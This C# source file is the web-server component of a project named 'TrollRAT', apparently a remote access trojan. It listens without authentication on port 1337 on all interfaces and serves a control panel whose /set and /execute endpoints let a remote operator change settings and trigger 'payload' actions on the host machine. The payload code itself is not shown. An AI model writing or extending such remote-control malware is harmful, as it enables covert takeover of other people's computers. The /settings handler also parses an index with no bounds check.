using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Reflection;
using System.IO;
using System.Runtime.Serialization.Json;
using System.Web;

namespace TrollRAT
{
    class WebServer
    {
        private byte[] site;

        private List<Payload> payloads = new List<Payload>();
        public List<Payload> Payloads => payloads;

        public WebServer()
        {
            var assembly = Assembly.GetExecutingAssembly();
            using (var stream = assembly.GetManifestResourceStream("TrollRAT.client.html"))
            {
                site = new byte[stream.Length];
                stream.Read(site, 0, (int)stream.Length);
            }
        }

        public void run()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:1337/");
            listener.Start();
            
            while (listener.IsListening)
            {
                var context = listener.GetContext();
                
                if (context.Request.HttpMethod == "GET")
                {
                    if (context.Request.Url.PathAndQuery == "/payloads")
                    {
                        StringBuilder content = new StringBuilder();
                        foreach (Payload payload in payloads)
                        {
                            content.Append("<a href=\"#\" onclick=\"getSettings(this);\" class=\"list-group-item clearfix\">");
                            content.Append(payload.Name);
                            content.Append("<span class=\"pull-right\">");

                            foreach (PayloadAction action in payload.Actions)
                            {
                                string btn = action.getListButton(payload);
                                if (btn != null)
                                {
                                    content.Append(btn);
                                }
                            }

                            content.Append("</span></a>");
                        }

                        byte[] data = Encoding.UTF8.GetBytes(content.ToString());
                        if (content.Length < 1)
                        {
                            data = Encoding.UTF8.GetBytes("<p>No settings defined.</p>");
                        }

                        context.Response.ContentLength64 = data.Length;
                        context.Response.StatusCode = 200;
                        context.Response.ContentType = "text/html";

                        context.Response.OutputStream.Write(data, 0, data.Length);
                    }
                    else if (context.Request.Url.AbsolutePath == "/actions")
                    {
                        int pl = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("payload"));

                        StringBuilder content = new StringBuilder();

                        if (pl >= 0 && pl < Payloads.Count)
                        {
                            Payload payload = payloads[pl];

                            foreach (PayloadAction action in payload.Actions)
                            {
                                string btn = action.getSettingsButton(payload);
                                if (btn != null)
                                {
                                    content.Append(btn);
                                }
                            }
                        }
                        else
                        {
                            content.Append("<p>Please select something.</p>");
                        }

                        byte[] data = Encoding.UTF8.GetBytes(content.ToString());
                        if (content.Length < 1)
                        {
                            data = Encoding.UTF8.GetBytes("<p>No actions defined.</p>");
                        }

                        context.Response.ContentLength64 = data.Length;
                        context.Response.StatusCode = 200;
                        context.Response.ContentType = "text/html";

                        context.Response.OutputStream.Write(data, 0, data.Length);
                    }
                    else if (context.Request.Url.AbsolutePath == "/set")
                    {
                        string value = HttpUtility.ParseQueryString(context.Request.Url.Query).Get("value");
                        int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));

                        foreach (Payload payload in payloads)
                        {
                            foreach (PayloadSetting setting in payload.Settings)
                            {
                                if (setting.ID == id)
                                {
                                    setting.readData(value);
                                }
                            }
                        }
                    }
                    else if (context.Request.Url.AbsolutePath == "/execute")
                    {
                        int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));

                        foreach (Payload payload in payloads)
                        {
                            foreach (PayloadAction action in payload.Actions)
                            {
                                if (action.ID == id)
                                {
                                    string response = action.execute(payload);

                                    byte[] data = Encoding.UTF8.GetBytes(response.ToString());

                                    context.Response.ContentLength64 = data.Length;
                                    context.Response.StatusCode = 200;
                                    context.Response.ContentType = "text/javascript";

                                    context.Response.OutputStream.Write(data, 0, data.Length);
                                }
                            }
                        }
                        
                    }
                    else if (context.Request.Url.AbsolutePath == "/settings")
                    {
                        // TODO Error handling
                        int i = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("index"));
                        Payload payload = payloads[i];

                        StringBuilder content = new StringBuilder();
                        foreach (PayloadSetting setting in payload.Settings)
                        {
                            setting.writeHTML(content);
                        }

                        byte[] data = Encoding.UTF8.GetBytes(content.ToString());
                        if (content.Length < 1)
                        {
                            data = Encoding.UTF8.GetBytes("<p>No settings defined.</p>");
                        }

                        context.Response.ContentLength64 = data.Length;
                        context.Response.StatusCode = 200;
                        context.Response.ContentType = "text/html";

                        context.Response.OutputStream.Write(data, 0, data.Length);
                    }
                    else
                    {
                        context.Response.ContentLength64 = site.Length;
                        context.Response.StatusCode = 200;
                        context.Response.ContentType = "text/html";

                        context.Response.OutputStream.Write(site, 0, site.Length);
                    }

                    context.Response.Close();
                } else if (context.Request.HttpMethod == "POST")
                {
                    
                }
            }
        }
    }
}
